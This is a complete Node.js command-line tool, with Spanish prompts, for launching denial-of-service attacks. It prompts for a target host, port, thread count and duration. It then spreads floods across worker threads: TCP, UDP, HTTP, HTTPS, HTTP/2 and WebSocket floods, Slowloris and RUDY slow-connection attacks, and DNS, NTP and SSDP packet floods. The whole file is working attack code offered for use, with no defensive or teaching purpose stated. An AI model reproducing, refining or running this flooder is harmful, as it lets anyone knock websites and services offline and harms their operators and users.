#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const WebSocket = require('ws');
const { Worker, isMainThread, workerData, parentPort } = require('worker_threads');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');
const { randomBytes, randomFillSync } = require('crypto');
const url = require('url');
const dns = require('dns/promises');

class DDoSAttack {
    constructor() {
        this.stats = { total: 0, success: 0, failed: 0, bandwidth: 0, start: 0 };
        this.config = {
            workers: [],
            anim: ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏'],
            methods: ['TCP','UDP','HTTP','HTTPS','HTTP2','WEBSOCKET','SLOWLORIS','DNS','NTP','SSDP','ICMP','RUDY']
        };
        this.running = false;
    }

    async init() {
        const targetInput = await this.ask(chalk.greenBright('IP/URL objetivo: '));
        const parsed = await this.parseTarget(targetInput);
        this.target = parsed.hostname;
        this.port = parsed.port;
        this.resolvedIP = await this.resolveTarget(this.target);

        if (net.isIP(this.target) && !parsed.hasPort) {
            const portInput = await this.ask(chalk.greenBright('Puerto: ')) || '80';
            this.port = parseInt(portInput, 10);
        }

        this.threads = Math.min(parseInt(await this.ask(chalk.greenBright('Hilos (50-500): ')) || 100, 10), 500);
        this.duration = Math.min(parseInt(await this.ask(chalk.greenBright('Duración (segundos): ')) || 60, 10), 3600);
        this.selectedMethods = await this.selectMethods();
        this.generatePayloads();
        this.showAttackSummary();
        this.start();
    }

    async parseTarget(input) {
        try {
            let original = input;
            if (!input.startsWith('http')) input = `http://${input}`;
            const parsed = new url.URL(input);
            const hasPort = original.includes(':') && !!parsed.port;
            return {
                hostname: parsed.hostname,
                port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
                hasPort
            };
        } catch {
            console.log(chalk.red('Formato inválido'));
            process.exit(1);
        }
    }

    async resolveTarget(host) {
        if (net.isIP(host)) return host;
        try {
            const { address } = await dns.lookup(host);
            console.log(chalk.yellow(`Resolución DNS: ${host} => ${address}`));
            return address;
        } catch {
            console.log(chalk.red('Error DNS'));
            process.exit(1);
        }
    }

    async selectMethods() {
        const prompt =
            chalk.greenBright('Métodos disponibles:\n') +
            chalk.yellow(this.config.methods.join(', ') + '\n') +
            chalk.greenBright('Métodos (separar por coma) [Enter para todos]: ');
        const answer = await this.ask(prompt);
        return answer
            ? answer.toUpperCase().split(',').map(m => m.trim()).filter(Boolean)
            : this.config.methods;
    }

    generatePayloads() {
        const make = size => { 
            const buf = Buffer.alloc(size); 
            randomFillSync(buf); 
            return buf; 
        };
        this.payloads = {
            tcp:  make(1024),
            udp:  make(65507),
            http: `GET /${randomBytes(8).toString('hex')} HTTP/1.1\r\nHost: ${this.target}\r\n\r\n`,
            dns:  this.createDnsPacket(),
            ntp:  Buffer.from([0x1B, ...Buffer.alloc(47)]),
            ssdp: Buffer.from('M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nMAN:"ssdp:discover"\r\nMX:1\r\nST:ssdp:all\r\n\r\n'),
            rudy: Buffer.from('POST / HTTP/1.1\r\nContent-Length:1000000\r\n\r\n')
        };
    }

    createDnsPacket() {
        const domain = randomBytes(8).toString('hex') + '.com';
        return Buffer.from([
            0xAA,0xAA,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
            domain.length, ...Buffer.from(domain), 0x00,0x00,0x01,0x00,0x01
        ]);
    }

    showAttackSummary() {
        console.log(chalk.cyanBright('\nConfiguración:'));
        console.log(chalk.yellow(`Objetivo: ${this.target}:${this.port}`));
        console.log(chalk.yellow(`Duración: ${this.duration}s`));
        console.log(chalk.yellow(`Hilos: ${this.threads}`));
        console.log(chalk.yellow(`Métodos: ${this.selectedMethods.join(', ')}`));
        console.log();
    }

    start() {
        this.running = true;
        this.stats.start = performance.now();
        console.log(chalk.green('Iniciando ataque...'));
        this.launchWorkers();
        this.showStats();
        setTimeout(() => this.stop(), this.duration * 1000);
    }

    launchWorkers() {
        const cores = Math.min(require('os').cpus().length, 16);
        const perWorker = Math.ceil(this.threads / cores);
        for (let i = 0; i < cores; i++) {
            const worker = new Worker(__filename, {
                workerData: {
                    target: this.resolvedIP,
                    port: this.port,
                    payloads: this.payloads,
                    methods: this.selectedMethods,
                    threads: perWorker,
                    hostHeader: this.target
                }
            });
            worker.on('message', msg => this.updateStats(msg));
            worker.on('error', err => console.error(chalk.red(`Worker Error: ${err.message}`)));
            this.config.workers.push(worker);
        }
    }

    updateStats({ total, success, failed, bw }) {
        this.stats.total    += total;
        this.stats.success  += success;
        this.stats.failed   += failed;
        this.stats.bandwidth += bw;
    }

    showStats() {
        if (!this.running) return;
        const elapsed = (performance.now() - this.stats.start) / 1000;
        const frame   = this.config.anim[Math.floor(elapsed * 10) % 10];
        const rps     = (this.stats.total / elapsed || 0).toFixed(0);
        const bwGB    = (this.stats.bandwidth / 1024 ** 3).toFixed(3);
        process.stdout.write(
            chalk`\r{green ${frame}} T:{greenBright ${elapsed.toFixed(1)}s} ` +
            `Req:{cyan ${this.stats.total}} SPS:{cyan ${rps}} ` +
            `BW:{cyan ${bwGB}GB} ({green ${this.stats.success}}|{red ${this.stats.failed}})`
        );
        setTimeout(() => this.showStats(), 100);
    }

    stop() {
        this.running = false;
        this.config.workers.forEach(w => w.terminate());
        console.log(chalk.yellow('\nAtaque detenido\n'));
        process.exit();
    }

    ask(prompt) {
        return new Promise(resolve => {
            const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
            rl.question(prompt, answer => { rl.close(); resolve(answer); });
        });
    }
}

if (isMainThread) {
    new DDoSAttack().init();
} else {
    const { target, port, payloads, methods, threads, hostHeader } = workerData;
    const sockets = new Set();

    const attackMethods = {
        TCP: () => {
            const s = new net.Socket();
            sockets.add(s);
            s.connect(port, target, () => {
                s.write(payloads.tcp);
                report('success', payloads.tcp.length);
                s.destroy();
            }).on('error', () => {
                report('failed', 0);
                sockets.delete(s);
            });
        },
        
        UDP: () => {
            const s = dgram.createSocket('udp4');
            s.send(payloads.udp, port, target, err => {
                err ? report('failed', 0) : report('success', payloads.udp.length);
                s.close();
            });
        },

        HTTP: () => {
            const req = http.request({ 
                hostname: target, 
                port,
                method: 'GET',
                headers: { 
                    Host: hostHeader,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                    'Accept-Language': 'en-US,en;q=0.9'
                }
            }, res => {
                res.on('data', () => {});
                res.on('end', () => report('success', 0));
            });
            req.on('error', () => report('failed', 0));
            req.end();
        },

        HTTPS: () => {
            const req = https.request({
                hostname: target,
                port,
                rejectUnauthorized: false,
                method: 'GET',
                headers: { 
                    Host: hostHeader,
                    'Cache-Control': 'no-cache'
                }
            }, res => {
                res.on('data', () => {});
                res.on('end', () => report('success', 0));
            });
            req.on('error', () => report('failed', 0));
            req.end();
        },

        HTTP2: () => {
            const client = http2.connect(`https://${target}:${port}`, { 
                rejectUnauthorized: false 
            });
            client.on('error', () => report('failed', 0));
            
            const req = client.request({ 
                ':path': '/',
                ':authority': hostHeader,
                'user-agent': 'Mozilla/5.0'
            });
            req.on('data', () => {});
            req.on('end', () => {
                report('success', 0);
                client.close();
            });
            req.end();
        },

        WEBSOCKET: () => {
            const ws = new WebSocket(`ws://${target}:${port}`, { 
                headers: { Host: hostHeader },
                handshakeTimeout: 5000
            });
            ws.on('open', () => {
                ws.send(payloads.tcp);
                report('success', payloads.tcp.length);
                ws.close();
            }).on('error', () => report('failed', 0));
        },

        SLOWLORIS: () => {
            const s = net.connect(port, target);
            sockets.add(s);
            s.write(`GET / HTTP/1.1\r\nHost: ${hostHeader}\r\n`);
            const timer = setInterval(() => {
                s.write(`X-${randomBytes(2).toString('hex')}: ${Math.random()}\r\n`);
            }, 15000);
            s.on('error', () => {
                clearInterval(timer);
                sockets.delete(s);
            });
        },

        DNS: () => {
            const s = dgram.createSocket('udp4');
            s.send(payloads.dns, port, target, err => {
                err ? report('failed', 0) : report('success', payloads.dns.length);
                s.close();
            });
        },

        NTP: () => {
            const s = dgram.createSocket('udp4');
            s.send(payloads.ntp, port, target, err => {
                err ? report('failed', 0) : report('success', payloads.ntp.length);
                s.close();
            });
        },

        SSDP: () => {
            const s = dgram.createSocket('udp4');
            s.send(payloads.ssdp, port, target, err => {
                err ? report('failed', 0) : report('success', payloads.ssdp.length);
                s.close();
            });
        },

        ICMP: () => {
            const s = dgram.createSocket('udp4');
            s.send(Buffer.alloc(64), port, target, err => {
                err ? report('failed', 0) : report('success', 64);
                s.close();
            });
        },

        RUDY: () => {
            const s = net.connect(port, target);
            sockets.add(s);
            s.write(payloads.rudy);
            const slow = () => {
                if (s.writable) {
                    s.write(`${randomBytes(2).toString('hex')}=`);
                    setTimeout(slow, 500).unref();
                }
            };
            slow();
            s.on('error', () => {
                sockets.delete(s);
                report('failed', 0);
            });
        }
    };

    function report(type, bw) {
        parentPort.postMessage({ 
            total: 1, 
            success: type === 'success' ? 1 : 0, 
            failed: type === 'failed' ? 1 : 0, 
            bw: bw || 0 
        });
    }

    // Bucle de ataque optimizado
    setInterval(() => {
        methods.forEach(method => {
            for (let i = 0; i < threads * 2; i++) {
                try {
                    attackMethods[method]();
                } catch (err) {
                    report('failed', 0);
                }
            }
        });
    }, 100);
}